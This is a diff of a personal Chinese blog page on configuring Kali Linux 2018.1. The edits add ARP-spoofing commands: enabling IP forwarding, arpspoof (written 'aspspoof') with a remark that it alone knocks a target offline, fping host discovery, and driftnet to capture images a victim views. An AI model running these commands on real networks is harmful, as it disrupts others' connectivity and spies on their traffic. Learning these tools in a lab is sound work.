@@ -87,7 +87,7 @@
 <meta property="og:site_name" content="JERRY HOME">
 <meta property="og:description" content="本文讲述了在完成kali安装后其配置的基础过程。操作系统为kali 2018.1">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-03-06T05:46:11.000Z">
+<meta property="og:updated_time" content="2018-03-06T06:36:08.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="kali的学习">
 <meta name="twitter:description" content="本文讲述了在完成kali安装后其配置的基础过程。操作系统为kali 2018.1">
@@ -368,8 +368,9 @@
 <p>配置文件修改完成后，使用<code>apt-get update</code>命令更新源，使用<code>apt-get dist-upgrade</code>命令安装源。</p>
 <h3 id="安装vmware-tools工具"><a href="#安装vmware-tools工具" class="headerlink" title="安装vmware tools工具"></a>安装vmware tools工具</h3><p>在虚拟机菜单中，找到vmware tools工具，载入镜像进行安装。安装时的参数为默认值，安装完成后重启即可。</p>
 <h3 id="kali美化"><a href="#kali美化" class="headerlink" title="kali美化"></a>kali美化</h3><p>执行<code>apt-get install kde-full</code>，安装美化界面。安装完成后，在登录时选择该界面即可。</p>
-<h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><p><a href="https://segmentfault.com/a/1190000009562333" target="_blank" rel="noopener">ARP欺骗原理</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aspspoof -i &lt;网卡名&gt; -t &lt;欺骗目标IP&gt;  &lt;我是谁&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><p><a href="https://segmentfault.com/a/1190000009562333" target="_blank" rel="noopener">ARP欺骗原理</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward  <span class="comment">#打开IP转发</span></span><br><span class="line">aspspoof -i &lt;网卡名&gt; -t &lt;欺骗目标IP&gt;  &lt;我是谁&gt;  <span class="comment">#仅执行该命令则为arp断网攻击</span></span><br></pre></td></tr></table></figure></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fping -asg 192.168.1.0/24  <span class="comment">#查询在线IP</span></span><br></pre></td></tr></table></figure>
+<p>###获取浏览过得图片<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）开启ARP欺骗</span><br><span class="line">（2）driftnet -d 存放目录 -i 网卡名称</span><br></pre></td></tr></table></figure></p>
 
       
     </div>
